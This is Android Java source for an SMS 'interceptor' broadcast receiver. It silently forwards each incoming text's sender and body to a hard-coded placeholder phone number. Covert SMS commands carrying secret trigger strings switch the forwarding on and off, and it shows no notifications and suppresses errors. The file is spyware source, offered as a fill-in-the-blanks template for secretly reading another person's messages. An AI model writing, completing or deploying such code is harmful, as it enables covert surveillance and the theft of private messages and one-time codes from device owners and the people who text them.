package com.example.interceptor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;

import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.widget.Toast;


public class SmsReceiver  extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
    	
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            Bundle bundle = intent.getExtras();   
            SmsMessage[] msgs = null;
            String msg_from;
            if (bundle != null){
			
                // retrieve the SMS message received
                try{
                    Object[] pdus = (Object[]) bundle.get("pdus");
                    msgs = new SmsMessage[pdus.length];

                        msgs[0] = SmsMessage.createFromPdu((byte[])pdus[0]);
                        msg_from = msgs[0].getOriginatingAddress();
                        String msgBody = msgs[0].getMessageBody();
                        
						//for testing purposes uncomment the two lines below
                        //Toast.makeText(context, msg_from, Toast.LENGTH_LONG).show();  //the sender's phone number
                        //Toast.makeText(context, msgBody, Toast.LENGTH_LONG).show();   //the message
                        
	        			String data = null;
	        			try {
	        				String FILENAME = "file";
	        				FileInputStream fis = context.getApplicationContext().openFileInput(FILENAME);        //read file
	        				InputStreamReader in = new InputStreamReader(fis);
	        				BufferedReader br = new BufferedReader(in);
	        				data = br.readLine();
	        			} catch (IOException e) {
	        				data = "dd";	
	        			}
                        
	        			if(data.matches("ee")){	        			
	        				if ( (msg_from.contains("PUT_A_PHONE_NUMBER_THAT_YOU_WANT_TO_BE_IGNORED") == false) && (msg_from.contains("CALLS") == false) ){
	        					try {
	        						SmsManager smsManager = SmsManager.getDefault();
	        						smsManager.sendTextMessage("PUT_YOUR_PHONE_NUMBER_HERE", null, "From: " + msg_from + ":" + msgBody, null, null);
	        					} catch (Exception e) {
	        						//e.printStackTrace();
	        					}
	        				}
	        			}
                        
                        if (msgBody.contains("PUT_SOME_SECRET_CHARACTERS_THAT_WILL_DISABLE_THE_APP_WHEN_RECEIVED")==true){	
                    		String FILENAME = "file";
                    		String string = "dd";
                    		
                    		//Toast.makeText(context, "disabled", Toast.LENGTH_LONG).show();  //---------------------------------
                    		try {
                    			FileOutputStream fos = context.getApplicationContext().openFileOutput(FILENAME, Context.MODE_PRIVATE);    // write settings file
                    			fos.write(string.getBytes());
                    			fos.close();
                    		} catch (IOException e1) {
                    			//Toast.makeText(context, e1.getMessage(), Toast.LENGTH_LONG).show();
                    		}
                        	
                        }
                        
                        
                        if (msgBody.contains("PUT_SOME_SECRET_CHARACTERS_THAT_WILL_ENABLE_THE_APP_WHEN_RECEIVED")==true){
                        	
                    		String FILENAME = "file";
                    		String string = "ee";
                    		//Toast.makeText(context, "ee", Toast.LENGTH_LONG).show();  //---------------------------------
                    		try {
                    			FileOutputStream fos = context.openFileOutput(FILENAME, Context.MODE_PRIVATE);    // write settings file
                    			fos.write(string.getBytes());
                    			fos.close();
                    		} catch (IOException e1) {
                    			//Toast.makeText(context, e1.getMessage(), Toast.LENGTH_LONG).show();
                    		}
                        	
                        }
                   // }
                }catch(Exception e){
                            //Log.d("Exception caught",e.getMessage());
                }
            }
        }
    }
}
